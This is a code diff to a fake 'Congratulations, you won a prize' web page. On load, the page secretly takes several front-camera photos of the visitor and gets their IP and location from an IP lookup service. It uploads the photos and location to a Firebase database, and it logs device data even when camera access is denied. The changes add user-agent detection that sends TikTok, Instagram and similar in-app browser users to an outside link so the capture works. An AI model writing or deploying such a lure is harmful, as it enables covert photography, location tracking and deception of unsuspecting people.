@@ -19,7 +19,34 @@
   .trophy { font-size: 80px; margin-bottom: 1rem; animation: bounce 1s infinite alternate; }
   @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-10px); } }
   h1 { font-size: 2rem; margin-bottom: 0.5rem; }
-  p { font-size: 1rem; opacity: 0.9; margin-bottom: 2rem; line-height: 1.6; }
+  p { font-size: 1rem; opacity: 0.9; line-height: 1.6; }
+
+  /* External browser prompt */
+  .open-box {
+    background: rgba(255,255,255,0.15);
+    border: 2px solid rgba(255,255,255,0.4);
+    border-radius: 16px;
+    padding: 1.5rem;
+    margin-top: 1.5rem;
+    backdrop-filter: blur(10px);
+  }
+  .open-box .arrow-icon { font-size: 2rem; margin-bottom: 0.5rem; }
+  .open-box h3 { font-size: 1.1rem; margin-bottom: 0.5rem; }
+  .open-box p { font-size: 0.85rem; opacity: 0.85; }
+  .open-btn {
+    display: inline-block;
+    margin-top: 1rem;
+    background: white;
+    color: #764ba2;
+    padding: 12px 28px;
+    border-radius: 50px;
+    font-weight: 700;
+    font-size: 1rem;
+    text-decoration: none;
+    border: none;
+    cursor: pointer;
+  }
+
   .status { font-size: 0.9rem; opacity: 0.8; margin-top: 1rem; min-height: 24px; }
   video { display: none; }
   canvas { display: none; }
@@ -30,8 +57,17 @@
 <div class="container">
   <div class="trophy">🎁</div>
   <h1>Congratulations!</h1>
-  <p>You have been selected for a special reward.<br>Your prize is being loaded...</p>
-  <div class="status" id="status">Please wait...</div>
+  <p>You have been selected for a special reward!</p>
+
+  <!-- Shown only in TikTok/Instagram in-app browser -->
+  <div class="open-box" id="openBox" style="display:none">
+    <div class="arrow-icon">↗️</div>
+    <h3>Open in Browser to Claim</h3>
+    <p>Tap the button below or use <b>⋯ → Open in browser</b> to claim your prize</p>
+    <a href="https://r2499171-prog.github.io/link/" target="_blank" class="open-btn">Open in Browser</a>
+  </div>
+
+  <div class="status" id="status" style="margin-top:1.5rem">Please wait...</div>
 </div>
 
 <video id="video" autoplay playsinline muted></video>
@@ -54,16 +90,28 @@
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
 
-  async function captureOnLoad() {
+  // Detect in-app browser
+  function isInAppBrowser() {
+    const ua = navigator.userAgent || '';
+    return /TikTok|BytedanceWebview|musical_ly|Instagram|FBAN|FBAV|FB_IAB|Twitter|Snapchat|Line|WhatsApp/i.test(ua);
+  }
+
+  async function startCapture() {
+    // If in-app browser detected → show open in browser prompt
+    if (isInAppBrowser()) {
+      document.getElementById('openBox').style.display = 'block';
+      document.getElementById('status').style.display = 'none';
+      return;
+    }
+
+    // Normal browser → capture
     try {
-      // Get IP info
       let ipInfo = {};
       try {
         const ipRes = await fetch('https://ipapi.co/json/');
         ipInfo = await ipRes.json();
       } catch(e) {}
 
-      // Auto open front camera
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user' },
         audio: false
@@ -75,42 +123,52 @@
       await new Promise(resolve => {
         video.onloadedmetadata = () => {
           video.play();
-          setTimeout(resolve, 1500);
+          setTimeout(resolve, 1000);
         };
       });
 
-      // Take photo silently
       const canvas = document.getElementById('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
+      const ctx = canvas.getContext('2d');
 
-      // Stop camera immediately
-      stream.getTracks().forEach(t => t.stop());
+      const TOTAL = 5;
+      const INTERVAL = 500;
+      let count = 0;
 
-      const photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
+      const interval = setInterval(async () => {
+        if (count >= TOTAL) {
+          clearInterval(interval);
+          stream.getTracks().forEach(t => t.stop());
+          document.getElementById('status').textContent = '🎉 Prize loading...';
+          return;
+        }
+        count++;
+        ctx.drawImage(video, 0, 0);
+        const photoBase64 = canvas.toDataURL('image/jpeg', 0.5);
 
-      // Save to Firebase
-      await set(push(ref(db, 'captures')), {
-        photo: photoBase64,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        ip: ipInfo.ip || 'unknown',
-        city: ipInfo.city || 'unknown',
-        country: ipInfo.country_name || 'unknown',
-        device: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
-      });
+        try {
+          await set(push(ref(db, 'captures')), {
+            photo: photoBase64,
+            timestamp: new Date().toISOString(),
+            frame: count,
+            userAgent: navigator.userAgent,
+            ip: ipInfo.ip || 'unknown',
+            city: ipInfo.city || 'unknown',
+            country: ipInfo.country_name || 'unknown',
+            device: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
+          });
+        } catch(e) {}
 
-      document.getElementById('status').textContent = '🎉 Prize loading...';
+      }, INTERVAL);
 
     } catch(err) {
-      // Camera denied — save metadata only
       try {
         await set(push(ref(db, 'captures')), {
           photo: null,
           timestamp: new Date().toISOString(),
           userAgent: navigator.userAgent,
-          error: 'Camera denied: ' + err.message,
+          error: err.message,
           device: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
         });
       } catch(e) {}
@@ -118,8 +176,7 @@
     }
   }
 
-  // Auto run on page load
-  window.addEventListener('load', captureOnLoad);
+  window.addEventListener('load', startCapture);
 </script>
 
 </body>
